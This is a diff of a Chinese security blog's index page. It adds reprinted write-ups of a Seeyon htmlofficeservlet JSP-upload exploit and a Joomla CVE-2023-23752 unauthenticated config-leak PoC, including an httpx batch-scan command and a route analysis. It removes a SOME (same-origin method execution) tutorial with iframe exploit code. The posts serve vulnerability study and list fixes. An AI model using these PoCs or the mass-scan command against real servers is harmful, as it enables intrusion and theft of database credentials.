filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/vnd.ms-excel</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;% <span class="keyword">out</span>.println(&quot;seeyon_vuln&quot;);%&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b--</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、文件上传成功时，响应情况如下图所示：<br><img src="/2023/11/08/Upload-Seeyon/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>3、访问上传文件:<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/test.jsp,%E5%8F%91%E7%8E%B0%E8%AF%A5%E6%96%87%E4%BB%B6%E6%88%90%E5%8A%9F%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E3%80%82">http://xx.xx.xx.xx/test.jsp,发现该文件成功被服务器解析。</a><br><img src="/2023/11/08/Upload-Seeyon/2.png" alt="image"><br><img src="/2023/11/08/Upload-Seeyon/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="04-修复方案">04 修复方案</span></h2><blockquote>
+<p>1、对路径 &#x2F;seeyon&#x2F;htmlofficeservlet 进行限制访问。<br>2、致远官方已发布补丁，请联系官方安装相应补丁。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Seeyon/" rel="tag">Seeyon</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/CVE-2023-23752-Joomla/">
+                CVE-2023-23752 POC Joomla! 未授权访问漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="cve-2023-23752-poc-joomla-未授权访问漏洞">CVE-2023-23752 POC Joomla! 未授权访问漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2023-23752/">雨苁</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>在 Joomla! 版本为4.0.0 到 4.2.7中发现了一个漏洞,可以对 web 服务端点进行未经授权访问。</p>
+</blockquote>
+<h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>项目： Joomla！<br>子项目： CMS<br>影响：严重<br>严重性： 高<br>概率：高<br>版本： 4.0.0-4.2.7<br>利用类型：不正确的访问控制<br>报告日期： 2023-02-13<br>修复日期： 2023-02-16<br>CVE 编号： CVE​​-2023-23752</p>
+</blockquote>
+<h2><span id="描述">描述</span></h2><blockquote>
+<p>不正确的访问检查允许对 web 服务端点进行未经授权的访问。</p>
+</blockquote>
+<h2><span id="受影响的版本">受影响的版本</span></h2><blockquote>
+<p>Joomla! CMS 版本 4.0.0-4.2.7</p>
+</blockquote>
+<h2><span id="解决方案">解决方案</span></h2><blockquote>
+<p>升级到版本 4.2.8</p>
+</blockquote>
+<h2><span id="joomla安全中心公告">Joomla!安全中心公告</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.joomla.org/security-centre">https://developer.joomla.org/security-centre</a><br><img src="/2023/11/08/CVE-2023-23752-Joomla/1.png" alt="image"> </p>
+</blockquote>
+<h2><span id="poc">POC</span></h2><blockquote>
+<p><code>/api/index.php/v1/config/application?public=true</code></p>
+</blockquote>
+<h3><span id="批量测试">批量测试</span></h3><blockquote>
+<p><code>httpx -l ip.txt -path &#39;/api/index.php/v1/config/application?public=true&#39;</code></p>
+</blockquote>
+<h2><span id="测试效果">测试效果</span></h2><blockquote>
+<p><img src="/2023/11/08/CVE-2023-23752-Joomla/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12175">https://xz.aliyun.com/t/12175</a><br>Joomla(CVE-2023-23752)——一个请求参数 打穿Rest API<br>由于公司对漏洞的要求比较高，代码审计很快集中到了请求路由的代码块。不管是Wordpress&#x2F;RounderCube还是PhpMyAdmin以及一些知名度比较高的php应用（一个Java安全研究员感到头皮发麻），我的重点对象变成了请求路由的代码追踪，一旦分析经过路由选择之后，剩下的业务代码我是完全不看了。虽然有点不专业，但是这是挖掘未授权漏洞最好的道路，最终终于找到了一个不错的高危漏洞——Joomla未授权访问Rest API。</p>
+</blockquote>
+<h2><span id="受影响版本">受影响版本</span></h2><blockquote>
+<p>Joomla大致有三个路由入口，分别是：<br>根目录的index.php(用户访问文章)<br>根目录的administrator&#x2F;index.php(管理员管理)<br>根目录的api&#x2F;index.php(开发者爱好的Rest API)<br>未授权的接口正是第三个入口。因此影响的只有Joomla4.0.0——Joomla4.2.7（Rest API 4.x正式开发）</p>
+</blockquote>
+<h2><span id="分析">分析</span></h2><blockquote>
+<p>这里仅重点分析api&#x2F;index.php这个路由的问题（index.php和administrator&#x2F;index.php找不到漏洞）。<br>网站输入&#x2F;api&#x2F;index.php开启debug模式<br><img src="/2023/11/08/CVE-2023-23752-Joomla/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>index.php会来到app.php。其中$app主要的input成员存放所有的HTTP请求参数<br><img src="/2023/11/08/CVE-2023-23752-Joomla/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>在execute()函数中，会经过sanityCheckSystemVariables函数，此函数用来过滤渲染模板的参数，主要防止XSS漏洞。setupLogging和createExtensionNameSpaceMap主要是系统的额外记录工作。doExecute就是具体的路由逻辑函数。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/5.png" alt="image"><br>doExecute中最重要的就是route和dispatch函数。</p>
+</blockquote>
+<h2><span id="route路由选择与鉴权">route：路由选择与鉴权</span></h2><blockquote>
+<p>整个route函数分为两部分，路由选择和身份校验。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/6.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>逻辑十分清晰，主要是直接通过parseApiRoute函数从请求的方法和url到$routers中找到对应的路由信息<br><img src="/2023/11/08/CVE-2023-23752-Joomla/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>身份验证的代码加上debug信息可以知道public参数控制着API是否对外开放。默认情况下是false，不对外开放。但是这里大部分情况都会选择直接下一步。但是回过头看路由获取parseApiRoute时会有新的发现<br><img src="/2023/11/08/CVE-2023-23752-Joomla/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这里发送请求<br><code>http://x.x.x.x/api/index.php/v1/banners?public=true</code><br>再来看route变量会发现惊喜<br><img src="/2023/11/08/CVE-2023-23752-Joomla/9.png" alt="image"><br>此时route.var中的变量会被请求的变量覆盖。由于public&#x3D;true，所以接口不需要身份验证，直接到达路由分发，也就是业务逻辑。</p>
+</blockquote>
+<h2><span id="受损的api清单">受损的API清单</span></h2><blockquote>
+<p>由于能够直接访问API了，从中找到最终的信息即可。<br><code>/api/index.php/v1/config/application?public=true</code><br>此API用于获取网站最重要的配置信息，其中包含数据库的账号与密码。<br>其他受损API如下</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/banners/:id/contenthistory/keep</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/contacts/form/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/contacts/:id/contenthistory/keep</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/content/articles/:id/contenthistory/keep</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/extensions</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/overrides/search</span><br><span class="line">v1/languages/overrides/search/cache/refresh</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages</span><br><span class="line">v1/languages</span><br><span class="line">v1/media/adapters</span><br><span class="line">v1/media/adapters/:id</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path/</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/site/items/types</span><br><span class="line">v1/menus/administrator/items/types</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/modules/types/site</span><br><span class="line">v1/modules/types/administrator</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/plugins</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/requests/:id</span><br><span class="line">v1/privacy/requests/export/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/consents</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels/:id</span><br></pre></td></tr></table></figure>
+
+<h2><span id="复现">复现</span></h2><h3><span id="发送请求">发送请求</span></h3><blockquote>
+<p><code>http://127.0.0.1/api/index.php/v1/config/application?public=true</code></p>
+</blockquote>
+<h3><span id="效果">效果</span></h3><blockquote>
+<p><img src="/2023/11/08/CVE-2023-23752-Joomla/10.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Joomla/" rel="tag">Joomla</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/11/07/Weak-Password-Assembly/">
                 常见未授权弱口令组件总结
             </a>
@@ -374,454 +822,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/SOME-Attack/">
-                浅析同源方式执行（SOME）攻击
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="浅析同源方式执行some攻击">浅析同源方式执行（SOME）攻击</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169873.html">Str3am</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗取用户 cookie 为目的，直接劫持 cookie 经行操作，和 CSRF 攻击很类似，不同的是 CSRF 是构造一个请求，而 SOME 则希望脚本代码被执行。  非常感谢兔子师傅@Homaebic在分享会上的分享，才有了这篇文章。</p>
-</blockquote>
-<h2><span id="0x01-原理及危害">0x01 原理及危害</span></h2><blockquote>
-<p>想要理解SOME攻击，必须先对同源策略和JSONP技术有所了解，JSONP我理解为一种用户可控制js执行函数的跨域数据访问技术，详细可以参见这篇文章或者百度。<br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">SOME攻击</a><br>正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，主要危害比如点击链接后自动关注微博，自动点赞，自动授权等。</p>
-</blockquote>
-<h2><span id="0x02-攻击条件">0x02 攻击条件</span></h2><blockquote>
-<p>存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）<br>可控点可以输入”.”，点号（因为SOME攻击主要还是操作网页DOM）</p>
-</blockquote>
-<h2><span id="0x03-some复现">0x03 SOME复现</span></h2><blockquote>
-<p>这里通过一个大佬写的SOME靶场来练习复现，除了靶场，还有查找dom工具，exp生成，SOME原理介绍，很不错的一个学习网站。<br><img src="/2023/10/25/SOME-Attack/1.png" alt="image"> </p>
-<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/About">Same Origin Method Execution</a><br>点击第一个 Vulnerable Example 项目，并打开一个子网页，在颜色轮盘上选择任意颜色，发现父网页标签背景会根据选择改变。<br><img src="/2023/10/25/SOME-Attack/2.png" alt="image"> </p>
-<p>子网页其实就是一个JSONP可控点，当我们点击轮盘中的任意颜色后它的连接如下：<br><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor">https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor</a><br>现在我们想要做的就是控制callback参数，访问之后自动点击父页面的红色按钮。<br>利用第二个 Reference Generator 项目介绍的谷歌插件，这是一个可以自动获取元素DOM位置的插件。<br><img src="/2023/10/25/SOME-Attack/3.png" alt="image"></p>
-<p>右键即可获取，可在控制台中用click事件测试是否获取正确。<br><img src="/2023/10/25/SOME-Attack/4.png" alt="image"></p>
-<p>修改子页面参数如下：<br><code>https://www.someattack.com/Playground/ColorPicker.php?callback=box.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click</code></p>
-<p>访问之后弹窗，按钮被点击，SOME攻击实现。<br><img src="/2023/10/25/SOME-Attack/5.png" alt="image"></p>
-<p>兔子师傅演示的时候打开了两个网页some1和some2，打开some1后，用windiow。open方式打开some2页面，等some1页面加载完之后，some2地址location.replace到payload实现攻击。<br>我在实际测试的时候发现，当我打开第一个页面，然后直接开启一个新的页面访问payload，第一个页面是不会弹窗的，但是两个页面都是满足同源策略的，按理说执行脚本代码是没问题的，参阅文章后发现，要实现DOM操作，两个界面还必须满足父窗口和子窗口关系，这样子窗口才能够操作到父窗口的DOM，否则执行操作的时候会提示元素找不到的错误。兔子师傅这里是在some1下用window.open打开的some2界面，两个窗口父子关系是满足的。<br>同时，还需要注意一点的是，因为很多浏览器禁止window.open的原因（谷歌和火狐会禁止），兔子师傅的方法局限性很大，柠檬师傅采用了两个iframe的办法，避免了拦截，也很好的保证了同源性。附上柠檬师傅的代码</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://www.someattack.com/Playground/&quot;</span> name=b&gt;&lt;/iframe&gt;</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="title function_">open</span>(<span class="string">&#x27;https://www.someattack.com/Playground/&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="built_in">setTimeout</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">1</span>].<span class="property">location</span>.<span class="property">href</span> = <span 